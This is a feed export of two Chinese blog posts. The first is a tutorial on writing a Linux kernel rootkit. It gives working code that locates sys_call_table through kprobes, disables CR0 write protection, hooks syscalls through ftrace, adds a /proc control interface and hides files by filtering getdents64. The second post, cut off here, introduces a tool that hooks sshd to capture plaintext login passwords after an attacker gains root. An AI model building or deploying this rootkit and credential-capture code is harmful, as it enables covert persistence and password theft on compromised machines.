href=\"https://michael-prokop.at/blog/2021/05/27/what-to-expect-from-debian-bullseye-newinbullseye/\">Linux Kernel</a></p><pre><code>cat /boot/System.map-5.14.0-kali4-amd64                                                                                                                                                                                             \nffffffffffffffff B The real System.map is in the linux-image-&lt;version&gt;-dbg package</code></pre><p>接下来就是根据IDT表查找，然而我使用了sidt指令后无论如何都不给我返回正确的地址。。</p><p>在一番的搜寻后，我发现了如下方法</p><h1>ftrace辅助查找法</h1><p>这是一个非常新的技术，专门适用于 &gt;5.7 的linux 版本系统，详细可以查看这个文章</p><blockquote><p><a href=\"https://xcellerator.github.io/posts/linux_rootkits_11/\">Linux Rootkits: New Methods for Kernel 5.7+</a></p></blockquote><p>根据文章，我们可以直接使用</p><pre><code>#include &lt;linux/ftrace.h&gt;\n#include &lt;linux/kprobes.h&gt;\nstatic struct kprobe kp = {\n    .symbol_name = \"kallsyms_lookup_name\"\n};\n\n\nstatic void test(){\n    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);\n    kallsyms_lookup_name_t kallsyms_lookup_name;\n    register_kprobe(&amp;kp);\n    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;\n    unregister_kprobe(&amp;kp);\n    unsigned long *syscall_table = kallsyms_lookup_name(\"sys_call_table\");\n\n    printk(KERN_ALERT \"ROOTKIT syscall_table is at %p\",syscall_table);\n}</code></pre><p>就可以获得到syscall_table的地址。<br><figure><img alt=\"get_it.png\" data-src=\"https://9bie.org/usr/uploads/2022/01/1786112070.png\" src=\"https://9bie.org/usr/uploads/2022/01/1786112070.png\"><figcaption>get_it.png</figcaption></figure></p><p>接下来我们直接试着修改表内容，遇到的第一个问题就是cr0保护问题，</p><p>我使用如下代码</p><pre><code>      write_cr0(read_cr0() &amp; (~0x10000)); // 关闭内核写保护\n      oldadr = (unsigned int)syscall_table[__NR_uname]; // 保存真实地址\n      syscall_table[__NR_uname] = myfunc; // 修改地址\n      write_cr0(read_cr0() | 0x10000); // 恢复写保护</code></pre><p>遇到了如下问题：</p><pre><code>[   11.148893] CR0 WP bit went missing!?\n</code></pre><p>经过一番查找，发现是在高版本中，内核会判断write_cr0是否被修改导致引发panic，根据如下的解决方案</p><pre><code>[how-to-write-to-protected-pages-in-the-linux-kernel][9]\n</code></pre><p>自定义一个inline function修改cr0值就可以，最后目前我们的代码如下</p><pre><code>#include &lt;linux/init.h&gt;  \n#include &lt;linux/module.h&gt;  \n#include &lt;linux/kernel.h&gt;\n#include &lt;linux/module.h&gt;\n#include &lt;linux/syscalls.h&gt;\nMODULE_LICENSE(\"GPL\");  \n#include &lt;linux/ftrace.h&gt;\n#include &lt;linux/kprobes.h&gt;\nstatic struct kprobe kp = {\n    .symbol_name = \"kallsyms_lookup_name\"\n};\nunsigned int oldadr;\nunsigned long *syscall_table;\nunsigned long __force_order;\ninline void mywrite_cr0(unsigned long cr0) {\n  asm volatile(\"mov %0,%%cr0\" : \"+r\"(cr0), \"+m\"(__force_order));\n}\nvoid enable_write_protection(void) {\n  unsigned long cr0 = read_cr0();\n  set_bit(16, &amp;cr0);\n  mywrite_cr0(cr0);\n}\nvoid disable_write_protection(void) {\n  unsigned long cr0 = read_cr0();\n  clear_bit(16, &amp;cr0);\n  mywrite_cr0(cr0);\n}\nvoid myfunc(void)\n{\n  printk(KERN_ALERT \"hook test!\\n\");\n  return;\n}\nstatic int hello_init(void)  \n{  \n    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);\n    kallsyms_lookup_name_t kallsyms_lookup_name;\n    register_kprobe(&amp;kp);\n    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;\n    unregister_kprobe(&amp;kp);\n    syscall_table = kallsyms_lookup_name(\"sys_call_table\");\n    printk(KERN_ALERT \"ROOTKIT syscall_table is at %p\",syscall_table);\n    if (syscall_table)\n    {\n      disable_write_protection();// 关闭内核写保护\n      oldadr = (unsigned int)syscall_table[__NR_uname]; // 保存真实地址\n      syscall_table[__NR_uname] = myfunc; // 修改地址\n      enable_write_protection(); // 恢复写保护\n      printk(KERN_ALERT \"hook success\\n\");\n    } else {\n      printk(KERN_ALERT \"hook failed\\n\");\n    }\n    printk(KERN_ALERT \"Hello, world\\n\");  \n  return 0;  \n}  \nstatic void hello_exit(void)  \n{  \n\n  if (syscall_table) {\n    disable_write_protection(); \n    syscall_table[__NR_uname] = oldadr; // 恢复原地址\n    enable_write_protection();\n    printk(KERN_ALERT \"resume syscall table, module removed\\n\");\n  }\n  printk(KERN_ALERT \"Goodbye, cruel world\\n\");  \n}\nmodule_init(hello_init);  \nmodule_exit(hello_exit);  </code></pre><p>然后Makefile文件不变，在我linux-5.14下编译通过</p><h1>HOOK</h1><p>上面的代码我们使用了<code>syscall_table[__NR_uname] </code>进行函数的HOOK，这样不是不行，但是我们都引用了ftrace包了，自然应该使用更优雅的HOOK方案。</p><p>详细文档在这：<a href=\"https://www.kernel.org/doc/html/latest/trace/ftrace-uses.html\">Using ftrace to hook to functions - kernel.org </a></p><p>直接根据文档</p><pre><code>\nstruct ftrace_ops ops = {\n      .func                    = my_callback_func,\n      .flags                   = FTRACE_OPS_FL_SAVE_REGS\n                | FTRACE_OPS_FL_RECURSION_SAFE\n                | FTRACE_OPS_FL_IPMODIFY;\n};\n\n\nret = ftrace_set_filter_ip(&amp;ops, sys_call_table_function_address, 0, 0);\n\nregister_ftrace_function(&amp;ops);\n</code></pre><p>就这样，一个HOOK就做好了。该HOOK和我们以往的HOOK并不太一样，以往的HOOK都是直接暴力修改sys_call_table的地址。</p><p>然而ftrace是用其他的实现方式，文档中使用了callback进行HOOK函数的回调，原型如下</p><pre><code>void callback_func(unsigned long ip, unsigned long parent_ip,\n                   struct ftrace_ops *op, struct pt_regs *regs);</code></pre><p>然后，每个参数的功能如下。</p><p>@ip<br>This is the instruction pointer of the function that is being traced. (where the fentry or mcount is within the function)</p><blockquote><p>@parent_ip This is the instruction pointer of the function that called<br>the the function being traced (where the call of the function<br>occurred).</p><p>@op This is a pointer to ftrace_ops that was used to register the</p><ol><li>This can be used to pass data to the callback via the</li><li>pointer.</li></ol><p>@regs If the FTRACE_OPS_FL_SAVE_REGS or<br>FTRACE_OPS_FL_SAVE_REGS_IF_SUPPORTED flags are set in the ftrace_ops<br>structure, then this will be pointing to the pt_regs structure like it<br>would be if an breakpoint was placed at the start of the function<br>where ftrace was tracing. Otherwise it either contains garbage, or<br>NULL.</p></blockquote><p>我英语贼辣鸡就不乱翻译了，我们看向其中的重点regs，regs是一个pt_regs 结构，研究我们之前LINUX进程注入的时候就应该很熟悉了，这东西会保存函数调用时寄存器中所有的信息，意味着我们如果需要参数，就需要根据linux调用方式从pt_regs的寄存器中分别读出内容。然后进行操作。</p><h2>重点</h2><p>同时，因为我们以往都是直接暴力修改函数地址制作HOOK，所以可能会造成思维定势，ftrace的HOOK和这不一样，这个callback并不是执行到HOOK点就替换成我们的callback，而是类似一个filter的存在。具体操作还是要看filter对于寄存器的IP的修改，如果不进行任何修改，那么仅仅在指行这个filter之后原本的函数还是会继续运行。所以我们的代码如下.我们假设HOOK一个mkdir。</p><pre><code>\nstatic asmlinkage long fake_mkdir(struct pt_regs *regs){\n     // do something  我们的HOOK函数\n     long ret = ori_sys_mkdir(regs); //保证原函数的运行\n     return ret;\n}\nvoid my_callback_func(unsigned long ip, unsigned long parent_ip,\n                   struct ftrace_ops *op, struct ftrace_regs *regs){\n  struct pt_regs *p_regs;\n  p_regs = ftrace_get_regs(regs); //必须要用这个方法把ftrace_regs转成pt_regs\n  p_regs-&gt;ip = (unsigned long)fake_mkdir;\n\n}\n\n\nstatic asmlinkage long (*ori_sys_mkdir)(struct pt_regs *regs); // 用于保存sys_mkdir的原始地址\nstatic void hook(){\n int err = ftrace_set_filter_ip(&amp;ops, sys_mkdir, 0, 0);\n       if(err)\n        {\n            printk(KERN_ALERT \"rootkit: ftrace_set_filter_ip() failed: %d\\n\", err);\n\n        }\n      err = register_ftrace_function(&amp;ops);\n      if(err)\n      {\n            printk(KERN_ALERT \"rootkit: register_ftrace_function() failed: %d\\n\", err);\n        }\n\n      *((unsigned long*) &amp;ori_sys_mkdir) = sys_mkdir;// 修改ori_sys_mkdir为原本的系统调用以备我们后续调用\n}</code></pre><p>以上就是一个简单的HOOK过程，可以看到callback其实并不是直接一个传统意义上的HOOK。也就是 修改-&gt;指行，而是更类似于一个工厂函数，下一步动作取决于工厂函数对寄存器的操作：我们修改了寄存器的IP让程序跳转到了我们的fake函数，进行了一些处理后，再把数据交给原本函数（当然不交也行）完成一个HOOK。</p><p>然而以上代码有一个非常严重的错误，这个错误甚至能导致你的系统奔溃，记住我们的HOOK不是直接替换地址。而是匹配地址就触发callback，也就是说，即使我们在fake函数中，正确调用了原本sys_mkdir后，还是会触发到我们的callback，然后再次被修改IP调转到我们的fake函数，然后fake函数再调用sys_mkdir然后再callback.....</p><p>这就造成了一个死循环。第一个想的解决办法，就是在fake函数调用sys_mkdir的时候取消掉filter的注册。。这样也不是不行，但是感觉开销太大了。于是乎我找到了一个好东西<code>within_module</code></p><pre><code>static inline bool within_module_core(unsigned long addr,\n                      const struct module *mod)\n{\n    return (unsigned long)mod-&gt;core_layout.base &lt;= addr &amp;&amp;\n           addr &lt; (unsigned long)mod-&gt;core_layout.base + mod-&gt;core_layout.size;\n}</code></pre><p>因为callback提供了上层调用者的IP，然后我们只需要用within_module和THIS_MODULE宏比对，判断调用sys_mkdir的是否是我们当前的模块就知道是否是fake函数调用来的，如果是那里调用来的则忽略HOOK请求</p><pre><code>void my_callback_func(unsigned long ip, unsigned long parent_ip,\n                   struct ftrace_ops *op, struct ftrace_regs *regs){\n  struct pt_regs *p_regs;\n  p_regs = ftrace_get_regs(regs); \n  if (!within_module(parent_ip, THIS_MODULE)){\n    p_regs-&gt;ip = (unsigned long)fake_mkdir;\n  }\n}</code></pre><h2>重点2</h2><p>我们把目光转到fake_mkdir，假设我们想HOOK，就必须要对参数进行修改，或者说是读取。</p><p>由于给了寄存器我们可以根据Linux系统调用约定来读取相关的内容。比如我们要读取第一个参数可以直接<code>char __user *pathname = (char *)regs-&gt;di;</code></p><p>但是我们会发现，如果直接printk出来的内容并不可读，这是因为模块处于内核空间，而我们输出的是用户空间，所以我们得需要<code>copy_to_user</code>和<code>copy_from_user</code>这两个函数把数据读取到用户空间才能输出内容</p><p>代码如下</p><pre><code>static asmlinkage long fake_mkdir(struct pt_regs *regs){\n    \n      char __user *pathname = (char *)regs-&gt;di;\n      char dir_name[NAME_MAX] = {0};\n      long error = strncpy_from_user(dir_name, pathname, NAME_MAX);//把数据读取到用户空间\n      if (error &gt;0){\n        printk(KERN_ALERT \"HOOK MKDIR NAME:\\t%s\\n\",dir_name);\n      }\n     long ret = ori_sys_mkdir(regs);\n     return ret;\n}</code></pre><p>效果如下<br><figure><img alt=\"屏幕截图 2022-02-12 135613.png\" data-src=\"https://9bie.org/usr/uploads/2022/02/2231717960.png\" src=\"https://9bie.org/usr/uploads/2022/02/2231717960.png\"><figcaption>屏幕截图 2022-02-12 135613.png</figcaption></figure><br>同理，我们如果要修改参数，就得用<code>copy_to_user</code>把我们本地的内容替换过去。</p><pre><code>static asmlinkage long fake_mkdir(struct pt_regs *regs){\n    \n      char __user *pathname = regs-&gt;di;\n      char dir_name[NAME_MAX] = \"a\";\n      long error = copy_to_user(pathname,dir_name, NAME_MAX);\n     long ret = ori_sys_mkdir(regs);\n     return ret;\n}</code></pre><p>效果如下<br><figure><img alt=\"屏幕截图 2022-02-12 170116.png\" data-src=\"https://9bie.org/usr/uploads/2022/02/1173412627.png\" src=\"https://9bie.org/usr/uploads/2022/02/1173412627.png\"><figcaption>屏幕截图 2022-02-12 170116.png</figcaption></figure><br>到这里，我们的HOOK基本就完成了</p><h1>交互</h1><p>这一章节可以省略，但是也不是不能讲讲，毕竟有时候比如我们需要进行一些交互的操作，类似于提权啊，或者一些其他高级操作的时候，我们不可能一直修改内核代码再编译，这样太麻烦了。所以我们得像shell命令一样，找一个地方进行交互。</p><p>网络上现有的大部分rootkit方案都是对/proc的proc_fops进行hook，对用户传入的数据进行处理。</p><p>关键我们看这个</p><pre><code>struct proc_dir_entry {\n    unsigned int low_ino;\n    unsigned short namelen;\n    const char* name;\n    mode_t mode;\n    nlink_t nlink;\n    uid_t uid;\n    gid_t gid;\n    loff_t size;\n    const struct inode_operations* proc_iops;\n\n    const struct file_operations* proc_fops;\n    struct proc_dir_entry* next, *parent, *subdir;\n    void* data;\n    read_proc_t* read_proc;\n    write_proc_t* write_proc;\n    atomic_t count;        /* use count */\n    int pde_users;    /* number of callers into module in progress */\n    spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */\n    struct completion* pde_unload_completion;\n    struct list_head pde_openers;    /* who did -&gt;open, but not -&gt;release */\n};</code></pre><blockquote><p>使用create_proc_entry()函數創建在/proc文件系統中創建一個虛擬文件<br>函數返回值的 proc_dir_entry 結構體中包含了/proc<br>節點的讀函數指針(read_proc_t*read_proc)、寫函數指針(write_proc_t<br>*write_proc)以及父節點、子節點信息等。讀寫函數的原型為：</p></blockquote><pre><code>typedef    int (read_proc_t)(char* page, char** start, off_t off,\n                             int count, int* eof, void* data);\ntypedef    int (write_proc_t)(struct file* file, const char __user* buffer,\n                              unsigned long count, void* data);</code></pre><blockquote><p>這兩個函數指針需要我們在創建完了節點之後再給其賦值，而函數也需要自己來實現。其實這兩個函數也就是當用戶空間讀寫該文件時，內核所做的動作。</p></blockquote><p>资料引用自：<a href=\"https://www.cntofu.com/book/46/linux_kernel/ff08_er_ff09_ff1a_proc_xu_ni_wen_jian_xi_tong.md\">proc虛擬文件系統</a></p><p>我们注意<code>proc_dir_entry</code>中的parent成员，这个成员可以指向父目录的成员。我们使用<code>create_proc_entry</code>在/proc下创建了一个虚拟文件后，就可以使用parent找到/proc的proc_dir_entry结构体，然后我们劫持proc的fops，这样我们的程序就能实现往/proc写入数据传递到我们ko模块的效果了。</p><p>或者不整那么花里胡哨的，就用普通在proc下专门创建个文件接收也不是不行。</p><p>原本我也是打算直接照抄的，然而在高版本linux中，这个地方出现了一点变化。</p><p>首先是从5.5开始<code>create_proc_entry()</code>被修改为<code>proc_create()</code>。</p><p>同时<code>proc_dir_entry</code> 结构体也变成了这样</p><pre><code>struct proc_dir_entry *proc_create(const char *name, \n        umode_t mode, \n        struct proc_dir_entry *parent, \n        const struct proc_ops *proc_ops);</code></pre><p>我们注意其中的<code>proc_ops</code>，由原先的<code>file_operations</code>类型转变程了<code>proc_ops</code>类型。详情可以查看：<a href=\"https://github.com/torvalds/linux/commit/97a32539b9568bb653683349e5a76d02ff3c3e2c\">proc: convert everything to struct proc_ops</a><br>这样用法也转变成了这样</p><pre><code>static const struct proc_ops proc_file_fops_output = {\n    .proc_read = rootkit_read,\n    .proc_write = rootkit_write,\n};</code></pre><p>其他基本就没啥问题了，</p><pre><code>char *cmd_output = NULL;\nint cmd_output_len = 0;\nssize_t output_write(struct file *file, const char *buf, size_t len, loff_t *offset)\n{\n    long error;\n\n    if(cmd_output_len != 0)\n        kfree(cmd_output);\n    cmd_output = kzalloc(len, GFP_KERNEL);\n    error = copy_from_user(cmd_output, buf, len);\n    printk(KERN_ALERT \"cmd_line: %s\\n\",cmd_output);\n    if(error)\n        return -1;\n    cmd_output_len = len;\n    return len;\n}\nssize_t output_read(struct file *file, char *buf, size_t len, loff_t *offset)\n{\n    int ret;\n    char *kbuf = NULL;\n    long error;\n    static int finished = 0;\n    kbuf = kzalloc(cmd_output_len, GFP_KERNEL);\n    strncpy(kbuf, cmd_output, cmd_output_len);\n\n\n    if ( finished )\n    {\n\n        finished = 0;\n        ret = 0;\n        goto out;\n    }\n    else\n    {\n\n        finished = 1;\n        error = copy_to_user(buf, kbuf, cmd_output_len);\n        if(error)\n            return -1;\n        ret = cmd_output_len;\n        goto out;\n    }\nout:\n    kfree(kbuf);\n    return ret;\n}\n\nstatic struct proc_ops proc_file_fops_output = {\n\n    .proc_read = output_read,\n    .proc_write = output_write,\n};\nstatic int hello_init(void)  \n{  \n  proc_entry = proc_create(\"test\", 0666, NULL, &amp;proc_file_fops_output);\n  if (proc_entry == NULL) {\n    printk(KERN_INFO \"fortune: Couldn't create proc entry\\n\");\n  }\n    printk(KERN_ALERT \"Hello, world\\n\");  \n  return 0;  \n}  </code></pre><p><figure><img alt=\"proc_ok.png\" data-src=\"https://9bie.org/usr/uploads/2022/01/3399401757.png\" src=\"https://9bie.org/usr/uploads/2022/01/3399401757.png\"><figcaption>proc_ok.png</figcaption></figure></p><p>这些完成之后，就该进入我们rootkit主要模块的编写了</p><h1>隐藏文件</h1><p>能hook sys_call_table后，解决了怎么hook的问题，接下来就是Hook哪里。</p><p>我们直接使用strace ls,来查看一个文件的调用栈。</p><pre><code>ioctl(1, TCGETS, {B38400 opost isig icanon echo ...}) = 0\nioctl(1, TIOCGWINSZ, {ws_row=48, ws_col=209, ws_xpixel=0, ws_ypixel=0}) = 0\nopenat(AT_FDCWD, \".\", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3\nnewfstatat(3, \"\", {st_mode=S_IFDIR|0755, st_size=4096, ...}, AT_EMPTY_PATH) = 0\ngetdents64(3, 0x5597ad35d730 /* 3 entries */, 32768) = 88\ngetdents64(3, 0x5597ad35d730 /* 0 entries */, 32768) = 0\nclose(3)                                = 0\nnewfstatat(1, \"\", {st_mode=S_IFCHR|0600, st_rdev=makedev(0x88, 0x1), ...}, AT_EMPTY_PATH) = 0\nwrite(1, \"5.16.5-arch1-1\\n\", 155.16.5-arch1-1\n)        = 15\nclose(1)                                = 0\nclose(2)                                = 0</code></pre><p>我就给出个部分，我们看到其中两个最主要的函数。一个是getdents64，一个是write。对于这两个，我们可以从 <a href=\"https://syscalls64.paolostivanin.com/\">Linux Syscall Reference</a> 中看出来，主要是sys_write和sys_getdents64这两个，前者是（仅仅针对ls的情况）对处理完的数据输出到控制台时候的操作，后者才是真正的Linux内核对于磁盘中文件处理的函数。</p><p>Hook两者各有利弊，Write主要在于系统中使用的地方太多，这种过滤影响性能不说，输出的文字形势千奇百怪，我们不好直接匹配，以及这是属于一种掩耳盗铃的手法，实际上系统任然能够操作文件。</p><p>所以我们还是HOOK后面一个函数比较好。直接对这个文件定义就行一个函数的查</p><pre><code>int sys_getdents64( unsigned int fd, struct linux_dirent 64 __user * dirent, unsigned int count);</code></pre><p>这就是函数的定义，我们其他都不看，就看中间这个<code>linux_dirent64 __user</code>，它的定义如下</p><pre><code>struct linux_dirent64 {\n    u64         d_ino;\n    s64         d_off;\n    unsigned short      d_reclen;\n    unsigned char       d_type;\n    char        d_name[];\n};</code></pre><p>其中，这个结构体，我们应该非常熟悉，因为我们在R3下使用LD_PRELOAD劫持进行文件隐藏时，也遇到过类似的结构，详情可以查看<a href=\"https://9bie.org/index.php/archives/354/\">这里</a> </p><p>其中d_relen包含着当前结构体长度，然后d_name写着当前目录的名称，我们要做的就是比对d_name，判断是否是我们需要隐藏的，如果是需要隐藏，则把这部分的结构体给删除掉。</p><p>那么如何删除呢。linux_dirent64 在内存种的排列是连续的，而且sys_getdents64的第二个参数dirent正好指向第一个linux_dirent64 结构体，所以根据上面的信息，我们只要知道linux_dirent64链表的大小，就能根据<code>linux_dirent64-&gt;d_reclen</code>，就能准确从连续的内存中分割出每一块linux_dirent64。</p><p>而sys_getdents64的返回值刚好就是linux_dirent64整片链表的大小，那么要素齐全了，我们就可以开始操作了。</p><p>开始摆烂，我直接上别人的源码了。代码引用自：<a href=\"https://github.com/xcellerator/linux_kernel_hacking/blob/master/3_RootkitTechniques/3.4_hiding_directories/rootkit.c#36\">rootkit.c</a></p><pre><code>#define PREFIX \"boogaloo\"\n\nstatic asmlinkage int fake_getdents64(const struct pt_regs *regs){\n   \n/* These are the arguments passed to sys_getdents64 extracted from the pt_regs struct */\n    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs-&gt;si;\n    long error;\n\n\n    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;\n    unsigned long offset = 0;\n\n    /* We first have to actually call the real sys_getdents64 syscall and save it so that we can\n     * examine it's contents to remove anything that is prefixed by PREFIX.\n     * We also allocate dir_entry with the same amount of memory as  */\n    int ret = ori_getdents64(regs);\n    dirent_ker = kzalloc(ret, GFP_KERNEL);\n    if ( (ret &lt;= 0) || (dirent_ker == NULL) )\n        return ret;\n    /* Copy the dirent argument passed to sys_getdents64 from userspace to kernelspace \n     * dirent_ker is our copy of the returned dirent struct that we can play with */\n    error = copy_from_user(dirent_ker, dirent, ret);\n    if (error)\n        goto done;\n    /* We iterate over offset, incrementing by current_dir-&gt;d_reclen each loop */\n    while (offset &lt; ret)\n    {\n        /* First, we look at dirent_ker + 0, which is the first entry in the directory listing */\n        current_dir = (void *)dirent_ker + offset;\n        /* Compare current_dir-&gt;d_name to PREFIX */\n        if ( memcmp(PREFIX, current_dir-&gt;d_name, strlen(PREFIX)) == 0)\n        {\n            /* If PREFIX is contained in the first struct in the list, then we have to shift everything else up by it's size */\n            if ( current_dir == dirent_ker )\n            {\n                ret -= current_dir-&gt;d_reclen;\n                memmove(current_dir, (void *)current_dir + current_dir-&gt;d_reclen, ret);\n                continue;\n            }\n            /* This is the crucial step: we add the length of the current directory to that of the \n             * previous one. This means that when the directory structure is looped over to print/search\n             * the contents, the current directory is subsumed into that of whatever preceeds it. */\n            previous_dir-&gt;d_reclen += current_dir-&gt;d_reclen;\n        }\n        else\n        {\n            /* If we end up here, then we didn't find PREFIX in current_dir-&gt;d_name \n             * We set previous_dir to the current_dir before moving on and incrementing\n             * current_dir at the start of the loop */\n            previous_dir = current_dir;\n        }\n\n        /* Increment offset by current_dir-&gt;d_reclen, when it equals ret, then we've scanned the whole\n         * directory listing */\n        offset += current_dir-&gt;d_reclen;\n    }\n    /* Copy our (perhaps altered) dirent structure back to userspace so it can be returned.\n     * Note that dirent is already in the right place in memory to be referenced by the integer\n     * ret. */\n    error = copy_to_user(dirent, dirent_ker, ret);\n    if (error)\n        goto done;\ndone:\n    /* Clean up and return whatever is left of the directory listing to the user */\n    kfree(dirent_ker);\n    return ret;\n}</code></pre><p>效果如下<br><figure><img alt=\"hidden_file.png\" data-src=\"https://9bie.org/usr/uploads/2022/02/1466236725.png\" src=\"https://9bie.org/usr/uploads/2022/02/1466236725.png\"><figcaption>hidden_file.png</figcaption></figure></p><p>自此，我们一个简易的隐藏文件就整好了</p><h1>自启动</h1><p>哪天不想咕咕咕了就来写</p><h1>结尾</h1><p>虽说只实现了一个文件隐藏功能，但是基本的rootkit所需具备的框架已经基本都完成了。</p><p>要对此进行扩展只需要使用<code>strace</code>找到HOOK点，然后添加HOOK，然后对数据进行处理。无外乎这些。</p><p>以前觉得啊rootkit好帅好流弊，这次才知道linux rootkit其实并不怎么轻松。</p><p>主要还是在于linux和windows的两种不同策略。linux在于可持续性可靠的文档。而windows讲究向下兼容。</p><p>Linux对于安全的态度是交给用户把控，而windows的话则强制要求签名。</p><p>所以导致Linux的rootkit对于系统版本的要求很严格，甚至一个更新内核关键数据修改就全部木大。</p><p>但是也不是没有办法，就是花时间和精力做出每个版本能勇的，然后遇到什么版本系统上什么版本系统的模块即可。</p><p>而windows的话则是直接一个强制驱动签名杀死了绝大部分rootkit。</p><p>没了，就这么多了。</p>"
    },
    "origin": {
        "streamId": 44,
        "title": "⑨BIE",
        "htmlUrl": "https://9bie.org/",
        "feedUrl": "https://9bie.org/index.php/feed/"
    }
},
{
    "id": "https://9bie.org/index.php/archives/890/",
    "timestampUsec": "1660193526434915",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "分析并HOOK SSHD来劫持密码",
    "author": ";⑨BIE",
    "published": 1656849120,
    "updated": 1656849120,
    "alternate": [
        {
            "href": "https://9bie.org/index.php/archives/890/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<h1>前言</h1><p>项目地址：<a href=\"https://github.com/9bie/sshdHooker\">sshdHooker</a>，开箱即用，但是只支持x64。</p><p>当我们通过洞，拿到一台linux机器的最高权限的时候，我们基本都想扩大战果。然而和windows不同，linux的加密方式除了某些特别远古版本的系统，大部分系统加密强度都是很高的，而且又没有类似lsass这样的东西甚至会把明文密码记录内存，也没有NTLM这种好用的通用token，所以基本都是使用一些特殊的方式记录密码。例如PAM，就比如我这个文章：<a href=\"https://9bie.org/index.php/archives/742/\">一般路过PAM后门 / SSH密码记录</a></p><p>改PAM有个很大的过程，那就是需要编译和替换文件，这个过程中，会遇到一个很大的问题，那就是编译版本和经常性的爆炸。那么问题来了，我们都拿到root了，就没有一种，简单粗暴的方法嘛？</p><p>在上面文章中，我们可以看到，使用strace监控所有文件调用，我们可以成功的在栈指行过程中记录到我们收到的密码明文。使用strace的优点是比如重编译PAM和替换文件，直接进行一个读取对于我们来说爆炸的几率实在是太低了。唯一的缺点就是直接用strace，生成的数据量实在是太多了，而且我们也没办法找到登陆的密码是否是我们想要的密码。</p><p>那么有没有什么办法，用类似strace的形式，读取内存并且过滤出我们想要的东西呢？这就是我们今天讨论的内容。</p><h1>流程分析</h1><p>先总结一下我们有什么，strace，是使用ptrace直接记录系统调用的，基本就是ptrace监听attach。所以我们的目标也很明确，就是使用ptrace整一个花活。</p><p>最开始的设想，是整一个监控栈指行的地方，直接定位到相关地址，然后检查栈的内容（传入的参数），转念一想，这不就是HOOK一个地址，然后把参数跳转到我们的函数，然后去检查传入内容，最后再把原始数据丢回原函数（地址）</p><p>正好，我们手头里之前研究过了一个东西，那就是linux下的进程注入器：<a href=\"https://9bie.org/index.php/archives/822/\">Linux下进程隐藏 二 -- 进程注入（So注入）</a></p><p>可以注入到内存之后，就要来一个经典问题：HOOK哪里？怎么HOOK？</p><h1>HOOK哪里-PAM调用机制</h1><p>从 <a href=\"https://9bie.org/index.php/archives/742/\">一般路过PAM后门 / SSH密码记录</a> 文章可以看到，我们的<code>unix_pam.so</code>是用来进行密码验证的模块</p><pre><code>// linux-pam/modules/pam_unix/pam_unix_auth.c\nint\npam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)\n{\n    unsigned long long ctrl;\n    int retval, *ret_data = NULL;\n    const char *name;\n    const char *p;\n\n    D((\"called.\"));\n\n    /* .....省略... */\n\n    /* verify the password of this user */\n    retval = _unix_verify_password(pamh, name, p, ctrl);\n    name = p = NULL;\n\n    AUTH_RETURN;\n}</code></pre><p>然而通过观察目录下其他文件，我们可以发现，其他模块也有 <code>pam_sm_authenticate</code>这个函数。该项目属于libpam，是sshd一个下属的模块之一，用于控制PAM模块。</p><p>我们观察了一下该目录下的其他模块，也都有 <code>pam_sm_authenticate</code> 之类的函数，那么我们大胆猜测一下，会不会是sshd的操作流程是</p><ul><li>sshd启动</li><li>加载libpam</li><li>libpam搜索目录下所有文件</li><li>libpam 动态加载pam_sm_authenticate</li><li>pam模块导入成功</li></ul><p>猜想没有用，还是得看源码是怎么写的。于是乎，直接在项目进行搜索。我们成功在pam_handle下发现了相关代码</p><pre><code>int _pam_add_handler(pam_handle_t *pamh\n             , int handler_type, int other, int stack_level, int type\n             , int *actions, const char *mod_path\n             , int argc, char **argv, int argvlen)\n{\n    struct loaded_module *mod = NULL;\n    struct handler **handler_p;\n    struct handler **handler_p2;\n    struct handlers *the_handlers;\n    const char *sym, *sym2;\n    char *mod_full_path;\n    servicefn func, func2;\n    int mod_type = PAM_MT_FAULTY_MOD;\n\n    D((\"called.\"));\n    IF_NO_PAMH(\"_pam_add_handler\",pamh,PAM_SYSTEM_ERR);\n\n    D((\"_pam_add_handler: adding type %d, handler_type %d, module `%s'\",\n    type, handler_type, mod_path));\n\n    if ((handler_type == PAM_HT_MODULE || handler_type == PAM_HT_SILENT_MODULE) &amp;&amp;\n    mod_path != NULL) {\n    if (mod_path[0] == '/') {\n        mod = _pam_load_module(pamh, mod_path, handler_type);\n    } else if (asprintf(&amp;mod_full_path, \"%s%s\",\n                 DEFAULT_MODULE_PATH, mod_path) &gt;= 0) {\n        mod = _pam_load_module(pamh, mod_full_path, handler_type);\n        _pam_drop(mod_full_path);\n    } else {\n        pam_syslog(pamh, LOG_CRIT, \"cannot malloc full mod path\");\n        return PAM_ABORT;\n    }\n\n    if (mod == NULL) {\n        /* if we get here with NULL it means allocation error */\n        return PAM_ABORT;\n    }\n\n    mod_type = mod-&gt;type;\n    }\n\n    if (mod_path == NULL)\n    mod_path = UNKNOWN_MODULE;\n\n    /*\n     * At this point 'mod' points to the stored/loaded module.\n     */\n\n    /* Now define the handler(s) based on mod-&gt;dlhandle and type */\n\n    /* decide which list of handlers to use */\n    the_handlers = (other) ? &amp;pamh-&gt;handlers.other : &amp;pamh-&gt;handlers.conf;\n\n    handler_p = handler_p2 = NULL;\n    func = func2 = NULL;\n    sym2 = NULL;\n\n    /* point handler_p's at the root addresses of the function stacks */\n    switch (type) {\n    case PAM_T_AUTH:\n    handler_p = &amp;the_handlers-&gt;authenticate;\n    sym = \"pam_sm_authenticate\";\n    handler_p2 = &amp;the_handlers-&gt;setcred;\n    sym2 = \"pam_sm_setcred\";\n    break;\n    case PAM_T_SESS:\n    handler_p = &amp;the_handlers-&gt;open_session;\n    sym = \"pam_sm_open_session\";\n    handler_p2 = &amp;the_handlers-&gt;close_session;\n    sym2 = \"pam_sm_close_session\";\n    break;\n    case PAM_T_ACCT:\n    handler_p = &amp;the_handlers-&gt;acct_mgmt;\n    sym = \"pam_sm_acct_mgmt\";\n    break;\n    case PAM_T_PASS:\n    handler_p = &amp;the_handlers-&gt;chauthtok;\n    sym = \"pam_sm_chauthtok\";\n    break;\n    default:\n    /* Illegal module type */\n    D((\"_pam_add_handler: illegal module type %d\", type));\n    return 